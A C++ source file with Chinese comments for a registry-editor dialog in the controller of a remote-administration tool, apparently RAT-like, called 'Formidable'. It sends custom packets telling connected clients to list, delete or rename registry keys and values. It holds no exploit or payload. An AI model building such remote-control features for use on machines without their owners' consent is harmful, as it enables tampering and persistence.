#ifndef UNICODE
#define UNICODE
#endif
#ifndef _UNICODE
#define _UNICODE
#endif
// RegistryDialog.cpp - 注册表管理对话框实现
#include "RegistryDialog.h"
#include "../resource.h"
#include "../../Common/Config.h"
#include "../../Common/ClientTypes.h"
#include "../GlobalState.h"
#include "../Utils/StringHelper.h"
#include <CommCtrl.h>
#include <vector>
#include <map>
#include <mutex>

extern std::map<uint32_t, std::shared_ptr<Formidable::ConnectedClient>> g_Clients;
extern std::mutex g_ClientsMutex;
extern HINSTANCE g_hInstance;
extern bool SendDataToClient(std::shared_ptr<Formidable::ConnectedClient> client, const void* pData, int iLength);

namespace Formidable {
namespace UI {

static std::map<HWND, uint32_t> s_dlgToClientId;

INT_PTR CALLBACK RegistryDialog::DlgProc(HWND hDlg, UINT message, WPARAM wParam, LPARAM lParam) {
    switch (message) {
    case WM_INITDIALOG: {
        uint32_t clientId = (uint32_t)lParam;
        s_dlgToClientId[hDlg] = clientId;
        
        SendMessageW(hDlg, WM_SETICON, ICON_SMALL, (LPARAM)LoadIconW(g_hInstance, MAKEINTRESOURCEW(IDI_REGISTRY)));
        SendMessageW(hDlg, WM_SETICON, ICON_BIG, (LPARAM)LoadIconW(g_hInstance, MAKEINTRESOURCEW(IDI_REGISTRY)));
        
        HWND hTree = GetDlgItem(hDlg, IDC_TREE_REGISTRY);
        HWND hList = GetDlgItem(hDlg, IDC_LIST_REGISTRY_VALUES);
        
        ListView_SetExtendedListViewStyle(hList, LVS_EX_FULLROWSELECT | LVS_EX_GRIDLINES);
        
        LVCOLUMNW lvc = { 0 };
        lvc.mask = LVCF_TEXT | LVCF_WIDTH;
        lvc.pszText = (LPWSTR)L"名称"; lvc.cx = 150; SendMessageW(hList, LVM_INSERTCOLUMNW, 0, (LPARAM)&lvc);
        lvc.pszText = (LPWSTR)L"类型"; lvc.cx = 100; SendMessageW(hList, LVM_INSERTCOLUMNW, 1, (LPARAM)&lvc);
        lvc.pszText = (LPWSTR)L"数据"; lvc.cx = 300; SendMessageW(hList, LVM_INSERTCOLUMNW, 2, (LPARAM)&lvc);
        
        // 添加根键
        TVINSERTSTRUCTW tvis = { 0 };
        tvis.hParent = TVI_ROOT;
        tvis.hInsertAfter = TVI_LAST;
        tvis.item.mask = TVIF_TEXT | TVIF_PARAM | TVIF_CHILDREN;
        tvis.item.cChildren = 1;
        
        tvis.item.pszText = (LPWSTR)L"HKEY_CLASSES_ROOT"; tvis.item.lParam = 0;
        TreeView_InsertItem(hTree, &tvis);
        tvis.item.pszText = (LPWSTR)L"HKEY_CURRENT_USER"; tvis.item.lParam = 1;
        TreeView_InsertItem(hTree, &tvis);
        tvis.item.pszText = (LPWSTR)L"HKEY_LOCAL_MACHINE"; tvis.item.lParam = 2;
        TreeView_InsertItem(hTree, &tvis);
        tvis.item.pszText = (LPWSTR)L"HKEY_USERS"; tvis.item.lParam = 3;
        TreeView_InsertItem(hTree, &tvis);
        tvis.item.pszText = (LPWSTR)L"HKEY_CURRENT_CONFIG"; tvis.item.lParam = 4;
        TreeView_InsertItem(hTree, &tvis);
        
        // 等待模块加载完成（模块已由 MainWindow 发送）
        Sleep(100);
        
        // 发送注册表初始化命令（加载HKEY_LOCAL_MACHINE的子项）
        Formidable::CommandPkg pkg = { 0 };
        pkg.cmd = Formidable::CMD_REGISTRY_CTRL;
        pkg.arg1 = 2; // HKEY_LOCAL_MACHINE
        pkg.arg2 = 1; // List Keys action
        std::string path = "";
        
        size_t bodySize = sizeof(Formidable::CommandPkg) + path.size();
        std::vector<char> sendBuf(sizeof(Formidable::PkgHeader) + bodySize);
        Formidable::PkgHeader* h = (Formidable::PkgHeader*)sendBuf.data();
        memcpy(h->flag, "FRMD26?", 7);
        h->originLen = (int)bodySize;
        h->totalLen = (int)sendBuf.size();
        
        memcpy(sendBuf.data() + sizeof(Formidable::PkgHeader), &pkg, sizeof(Formidable::CommandPkg));
        memcpy(sendBuf.data() + sizeof(Formidable::PkgHeader) + sizeof(Formidable::CommandPkg), path.c_str(), path.size());
        
        std::shared_ptr<Formidable::ConnectedClient> client;
        {
            std::lock_guard<std::mutex> lock(g_ClientsMutex);
            if (g_Clients.count(clientId)) client = g_Clients[clientId];
        }
        if (client) {
            SendDataToClient(client, sendBuf.data(), (int)sendBuf.size());
        }
        
        return (INT_PTR)TRUE;
    }
    case WM_SIZE: {
        RECT rc;
        GetClientRect(hDlg, &rc);
        int width = rc.right / 3;
        MoveWindow(GetDlgItem(hDlg, IDC_TREE_REGISTRY), 0, 0, width, rc.bottom, TRUE);
        MoveWindow(GetDlgItem(hDlg, IDC_LIST_REGISTRY_VALUES), width, 0, rc.right - width, rc.bottom, TRUE);
        return (INT_PTR)TRUE;
    }
    case WM_NOTIFY: {
        LPNMHDR nm = (LPNMHDR)lParam;
        // 树形控件事件
        if (nm->idFrom == IDC_TREE_REGISTRY) {
            if (nm->code == TVN_SELCHANGED) {
                // 树节点选择改变时，发送请求加载子项和值
                LPNMTREEVIEW pnmtv = (LPNMTREEVIEW)lParam;
                if (pnmtv->itemNew.hItem) {
                    // 构建完整路径
                    std::string path = "";
                    HTREEITEM hItem = pnmtv->itemNew.hItem;
                    std::vector<std::string> pathParts;
                    
                    while (hItem) {
                        TVITEMW tvi = { 0 };
                        wchar_t text[256];
                        tvi.mask = TVIF_TEXT | TVIF_PARAM;
                        tvi.pszText = text;
                        tvi.cchTextMax = 256;
                        tvi.hItem = hItem;
                        if (TreeView_GetItem(nm->hwndFrom, &tvi)) {
                            if (tvi.lParam >= 0 && tvi.lParam < 5) {
                                // 根键
                                const char* rootKeys[] = {"HKEY_CLASSES_ROOT", "HKEY_CURRENT_USER", "HKEY_LOCAL_MACHINE", "HKEY_USERS", "HKEY_CURRENT_CONFIG"};
                                pathParts.push_back(rootKeys[tvi.lParam]);
                            } else {
                                pathParts.push_back(Utils::StringHelper::WideToUTF8(text));
                            }
                        }
                        hItem = TreeView_GetParent(nm->hwndFrom, hItem);
                    }
                    
                    // 反转路径
                    std::reverse(pathParts.begin(), pathParts.end());
                    
                    // 组合路径，跳过根键
                    for (size_t i = 1; i < pathParts.size(); i++) {
                        if (i > 1) path += "\\";
                        path += pathParts[i];
                    }
                    
                    // 发送请求到服务端
                    uint32_t clientId = s_dlgToClientId[hDlg];
                    Formidable::CommandPkg pkg = { 0 };
                    pkg.cmd = Formidable::CMD_REGISTRY_CTRL;
                    pkg.arg1 = static_cast<uint32_t>(pnmtv->itemNew.lParam); // 根键索引
                    pkg.arg2 = 1; // 枚举子项
                    
                    size_t bodySize = sizeof(Formidable::CommandPkg) + path.size();
                    std::vector<char> sendBuf(sizeof(Formidable::PkgHeader) + bodySize);
                    Formidable::PkgHeader* h = (Formidable::PkgHeader*)sendBuf.data();
                    memcpy(h->flag, "FRMD26?", 7);
                    h->originLen = (int)bodySize;
                    h->totalLen = (int)sendBuf.size();
                    
                    memcpy(sendBuf.data() + sizeof(Formidable::PkgHeader), &pkg, sizeof(Formidable::CommandPkg));
                    memcpy(sendBuf.data() + sizeof(Formidable::PkgHeader) + sizeof(Formidable::CommandPkg), path.c_str(), path.size());
                    
                    std::shared_ptr<Formidable::ConnectedClient> client;
                    {
                        std::lock_guard<std::mutex> lock(g_ClientsMutex);
                        if (g_Clients.count(clientId)) client = g_Clients[clientId];
                    }
                    if (client) {
                        SendDataToClient(client, sendBuf.data(), (int)sendBuf.size());
                    }
                    
                    // 再次发送请求获取值 (使用arg2=2)
                    pkg.arg2 = 2;
                    bodySize = sizeof(Formidable::CommandPkg) + path.size();
                    sendBuf.resize(sizeof(Formidable::PkgHeader) + bodySize);
                    h = (Formidable::PkgHeader*)sendBuf.data();
                    memcpy(h->flag, "FRMD26?", 7);
                    h->originLen = (int)bodySize;
                    h->totalLen = (int)sendBuf.size();
                    
                    memcpy(sendBuf.data() + sizeof(Formidable::PkgHeader), &pkg, sizeof(Formidable::CommandPkg));
                    memcpy(sendBuf.data() + sizeof(Formidable::PkgHeader) + sizeof(Formidable::CommandPkg), path.c_str(), path.size());
                    
                    if (client) {
                        SendDataToClient(client, sendBuf.data(), (int)sendBuf.size());
                    }
                }
            } else if (nm->code == NM_RCLICK) {
                // 树形控件右键菜单
                POINT pt;
                GetCursorPos(&pt);
                HMENU hMenu = CreatePopupMenu();
                AppendMenuW(hMenu, MF_STRING, IDM_REG_REFRESH, L"刷新(&R)");
                AppendMenuW(hMenu, MF_SEPARATOR, 0, NULL);
                AppendMenuW(hMenu, MF_STRING, IDM_REG_NEW_KEY, L"新建项(&N)");
                AppendMenuW(hMenu, MF_STRING, IDM_REG_DELETE, L"删除(&D)");
                AppendMenuW(hMenu, MF_STRING, IDM_REG_RENAME, L"重命名(&M)");
                AppendMenuW(hMenu, MF_SEPARATOR, 0, NULL);
                AppendMenuW(hMenu, MF_STRING, IDM_REG_COPY_PATH, L"复制路径(&C)");
                AppendMenuW(hMenu, MF_STRING, IDM_REG_EXPORT, L"导出(&E)");
                TrackPopupMenu(hMenu, TPM_RIGHTBUTTON, pt.x, pt.y, 0, hDlg, NULL);
                DestroyMenu(hMenu);
            }
        }
        // 列表控件右键菜单
        if (nm->idFrom == IDC_LIST_REGISTRY_VALUES && nm->code == NM_RCLICK) {
            POINT pt;
            GetCursorPos(&pt);
            HMENU hMenu = CreatePopupMenu();
            HMENU hNewMenu = CreatePopupMenu();
            
            AppendMenuW(hNewMenu, MF_STRING, IDM_REG_NEW_VALUE + 1, L"字符串值");
            AppendMenuW(hNewMenu, MF_STRING, IDM_REG_NEW_VALUE + 2, L"DWORD 值");
            AppendMenuW(hNewMenu, MF_STRING, IDM_REG_NEW_VALUE + 3, L"二进制值");
            AppendMenuW(hNewMenu, MF_STRING, IDM_REG_NEW_VALUE + 4, L"多字符串值");
            
            AppendMenuW(hMenu, MF_STRING, IDM_REG_REFRESH, L"刷新(&R)");
            AppendMenuW(hMenu, MF_SEPARATOR, 0, NULL);
            AppendMenuW(hMenu, MF_POPUP, (UINT_PTR)hNewMenu, L"新建(&N)");
            AppendMenuW(hMenu, MF_SEPARATOR, 0, NULL);
            AppendMenuW(hMenu, MF_STRING, IDM_REG_MODIFY, L"修改(&M)");
            AppendMenuW(hMenu, MF_STRING, IDM_REG_DELETE, L"删除(&D)");
            AppendMenuW(hMenu, MF_STRING, IDM_REG_RENAME, L"重命名(&E)");
            AppendMenuW(hMenu, MF_SEPARATOR, 0, NULL);
            AppendMenuW(hMenu, MF_STRING, IDM_REG_COPY_NAME, L"复制名称(&C)");
            TrackPopupMenu(hMenu, TPM_RIGHTBUTTON, pt.x, pt.y, 0, hDlg, NULL);
            DestroyMenu(hMenu);
        } else if (nm->idFrom == IDC_LIST_REGISTRY_VALUES && nm->code == LVN_COLUMNCLICK) {
            LPNMLISTVIEW pnmlv = (LPNMLISTVIEW)lParam;
            HWND hList = pnmlv->hdr.hwndFrom;

            if (!g_SortInfo.count(hList)) {
                g_SortInfo[hList] = { pnmlv->iSubItem, true, hList };
            }

            if (g_SortInfo[hList].column == pnmlv->iSubItem) {
                g_SortInfo[hList].ascending = !g_SortInfo[hList].ascending;
            } else {
                g_SortInfo[hList].column = pnmlv->iSubItem;
                g_SortInfo[hList].ascending = true;
            }

            ListView_SortItems(hList, ListViewCompareProc, (LPARAM)&g_SortInfo[hList]);
        }
        break;
    }
    case WM_COMMAND: {
        uint32_t clientId = s_dlgToClientId[hDlg];
        switch (LOWORD(wParam)) {
        case IDM_REG_REFRESH:
        {
            HWND hTree = GetDlgItem(hDlg, IDC_TREE_REGISTRY);
            HTREEITEM hSelected = TreeView_GetSelection(hTree);
            if (hSelected) {
                // 模拟选择改变事件来触发刷新
                NM_TREEVIEWW nmtv = { 0 };
                nmtv.hdr.hwndFrom = hTree;
                nmtv.hdr.idFrom = IDC_TREE_REGISTRY;
                nmtv.hdr.code = TVN_SELCHANGED;
                nmtv.itemNew.hItem = hSelected;
                nmtv.itemNew.mask = TVIF_PARAM | TVIF_HANDLE;
                
                TVITEMW tvi = { 0 };
                tvi.hItem = hSelected;
                tvi.mask = TVIF_PARAM;
                if (TreeView_GetItem(hTree, &tvi)) {
                    nmtv.itemNew.lParam = tvi.lParam;
                    SendMessageW(hDlg, WM_NOTIFY, IDC_TREE_REGISTRY, (LPARAM)&nmtv);
                }
            }
            break;
        }
        case IDM_REG_DELETE:
        {
            HWND hTree = GetDlgItem(hDlg, IDC_TREE_REGISTRY);
            HWND hList = GetDlgItem(hDlg, IDC_LIST_REGISTRY_VALUES);
            
            // 检查是否在列表中选中了值
            int iSelected = ListView_GetNextItem(hList, -1, LVNI_SELECTED);
            if (iSelected != -1) {
                if (MessageBoxW(hDlg, L"确定要删除选中的数值吗？", L"确认删除", MB_YESNO | MB_ICONQUESTION) == IDYES) {
                    wchar_t valName[256];
                    ListView_GetItemText(hList, iSelected, 0, valName, 256);
                    
                    // 获取当前路径
                    std::string path = "";
                    HTREEITEM hItem = TreeView_GetSelection(hTree);
                    std::vector<std::string> pathParts;
                    uint32_t rootIdx = 0;
                    
                    while (hItem) {
                        TVITEMW tvi = { 0 };
                        wchar_t text[256];
                        tvi.mask = TVIF_TEXT | TVIF_PARAM;
                        tvi.pszText = text;
                        tvi.cchTextMax = 256;
                        tvi.hItem = hItem;
                        if (TreeView_GetItem(hTree, &tvi)) {
                            if (tvi.lParam >= 0 && tvi.lParam < 5) {
                                rootIdx = (uint32_t)tvi.lParam;
                                const char* rootKeys[] = {"HKEY_CLASSES_ROOT", "HKEY_CURRENT_USER", "HKEY_LOCAL_MACHINE", "HKEY_USERS", "HKEY_CURRENT_CONFIG"};
                                pathParts.push_back(rootKeys[tvi.lParam]);
                            } else {
                                pathParts.push_back(Utils::StringHelper::WideToUTF8(text));
                            }
                        }
                        hItem = TreeView_GetParent(hTree, hItem);
                    }
                    std::reverse(pathParts.begin(), pathParts.end());
                    for (size_t i = 1; i < pathParts.size(); i++) {
                        if (i > 1) path += "\\";
                        path += pathParts[i];
                    }
                    
                    std::string fullData = path + "|" + Utils::StringHelper::WideToUTF8(valName);
                    
                    Formidable::CommandPkg pkg = { 0 };
                    pkg.cmd = Formidable::CMD_REGISTRY_CTRL;
                    pkg.arg1 = rootIdx;
                    pkg.arg2 = 4; // Delete Value
                    
                    size_t bodySize = sizeof(Formidable::CommandPkg) + fullData.size();
                    std::vector<char> sendBuf(sizeof(Formidable::PkgHeader) + bodySize);
                    Formidable::PkgHeader* h = (Formidable::PkgHeader*)sendBuf.data();
                    memcpy(h->flag, "FRMD26?", 7);
                    h->originLen = (int)bodySize;
                    h->totalLen = (int)sendBuf.size();
                    
                    memcpy(sendBuf.data() + sizeof(Formidable::PkgHeader), &pkg, sizeof(Formidable::CommandPkg));
                    memcpy(sendBuf.data() + sizeof(Formidable::PkgHeader) + sizeof(Formidable::CommandPkg), fullData.c_str(), fullData.size());
                    
                    std::shared_ptr<Formidable::ConnectedClient> client;
                    {
                        std::lock_guard<std::mutex> lock(g_ClientsMutex);
                        if (g_Clients.count(clientId)) client = g_Clients[clientId];
                    }
                    if (client) SendDataToClient(client, sendBuf.data(), (int)sendBuf.size());
                }
            } else {
                // 检查是否在树中选中了项
                HTREEITEM hSelected = TreeView_GetSelection(hTree);
                if (hSelected) {
                    TVITEMW tvi = { 0 };
                    tvi.hItem = hSelected;
                    tvi.mask = TVIF_PARAM;
                    TreeView_GetItem(hTree, &tvi);
                    
                    if (tvi.lParam >= 5) { // 不允许删除根键
                        if (MessageBoxW(hDlg, L"确定要删除选中的项及其所有子项吗？", L"确认删除", MB_YESNO | MB_ICONQUESTION) == IDYES) {
                            // 获取路径逻辑同上... 为了简洁这里直接复用
                            std::string path = "";
                            HTREEITEM hItem = hSelected;
                            std::vector<std::string> pathParts;
                            uint32_t rootIdx = 0;
                            while (hItem) {
                                TVITEMW tvi2 = { 0 };
                                wchar_t text[256];
                                tvi2.mask = TVIF_TEXT | TVIF_PARAM;
                                tvi2.pszText = text;
                                tvi2.cchTextMax = 256;
                                tvi2.hItem = hItem;
                                if (TreeView_GetItem(hTree, &tvi2)) {
                                    if (tvi2.lParam >= 0 && tvi2.lParam < 5) {
                                        rootIdx = (uint32_t)tvi2.lParam;
                                        const char* rootKeys[] = {"HKEY_CLASSES_ROOT", "HKEY_CURRENT_USER", "HKEY_LOCAL_MACHINE", "HKEY_USERS", "HKEY_CURRENT_CONFIG"};
                                        pathParts.push_back(rootKeys[tvi2.lParam]);
                                    } else {
                                        pathParts.push_back(Utils::StringHelper::WideToUTF8(text));
                                    }
                                }
                                hItem = TreeView_GetParent(hTree, hItem);
                            }
                            std::reverse(pathParts.begin(), pathParts.end());
                            for (size_t i = 1; i < pathParts.size(); i++) {
                                if (i > 1) path += "\\";
                                path += pathParts[i];
                            }

                            Formidable::CommandPkg pkg = { 0 };
                            pkg.cmd = Formidable::CMD_REGISTRY_CTRL;
                            pkg.arg1 = rootIdx;
                            pkg.arg2 = 3; // Delete Key
                            
                            size_t bodySize = sizeof(Formidable::CommandPkg) + path.size();
                            std::vector<char> sendBuf(sizeof(Formidable::PkgHeader) + bodySize);
                            Formidable::PkgHeader* h = (Formidable::PkgHeader*)sendBuf.data();
                            memcpy(h->flag, "FRMD26?", 7);
                            h->originLen = (int)bodySize;
                            h->totalLen = (int)sendBuf.size();
                            
                            memcpy(sendBuf.data() + sizeof(Formidable::PkgHeader), &pkg, sizeof(Formidable::CommandPkg));
                            memcpy(sendBuf.data() + sizeof(Formidable::PkgHeader) + sizeof(Formidable::CommandPkg), path.c_str(), path.size());
                            
                            std::shared_ptr<Formidable::ConnectedClient> client;
                            {
                                std::lock_guard<std::mutex> lock(g_ClientsMutex);
                                if (g_Clients.count(clientId)) client = g_Clients[clientId];
                            }
                            if (client) SendDataToClient(client, sendBuf.data(), (int)sendBuf.size());
                        }
                    }
                }
            }
            break;
        }
        case IDCANCEL:
            EndDialog(hDlg, IDCANCEL);
            return (INT_PTR)TRUE;
        }
        break;
    }
    case WM_CLOSE:
        if (s_dlgToClientId.count(hDlg)) {
            uint32_t clientId = s_dlgToClientId[hDlg];
            std::lock_guard<std::mutex> lock(g_ClientsMutex);
            if (g_Clients.count(clientId)) {
                g_Clients[clientId]->hRegistryDlg = NULL;
            }
            s_dlgToClientId.erase(hDlg);
        }
        EndDialog(hDlg, 0);
        return (INT_PTR)TRUE;
    }
    return (INT_PTR)FALSE;
}

HWND RegistryDialog::Show(HWND hParent, uint32_t clientId) {
    return CreateDialogParamW(g_hInstance, MAKEINTRESOURCEW(IDD_REGISTRY), hParent, DlgProc, (LPARAM)clientId);
}

} // namespace UI
} // namespace Formidable
